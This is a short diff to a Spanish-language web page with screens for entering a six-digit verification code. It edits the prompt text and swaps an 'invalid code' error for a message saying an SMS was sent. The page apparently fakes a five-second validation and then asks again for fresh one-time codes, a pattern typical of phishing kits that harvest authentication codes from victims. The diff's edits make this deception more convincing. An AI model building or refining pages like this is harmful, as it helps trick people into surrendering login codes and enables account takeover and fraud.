@@ -183,7 +183,7 @@
   </div>
 
   <div class="screen" id="pantallaCodigo">
-    <h2>Ingrese el código que recibió por SMS</h2>
+    <h2>Ingrese el código que recibió por Correo Electronico luego enviaremos un SMS de texto a su telefono</h2>
     <div class="input-group">
       <div class="icon"><i class="fas fa-key"></i></div>
       <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
@@ -342,7 +342,7 @@
           mostrarPantalla("pantallaValidando");
           setTimeout(() => {
             mostrarPantalla("pantallaCodigo");
-            mensajeError.textContent = "Código inválido. Por favor, ingrese el código correctamente.";
+            mensajeError.textContent = "Código SMS ENVIADO.";
             document.getElementById("codigo").value = "";
           }, 5000);
         } else {
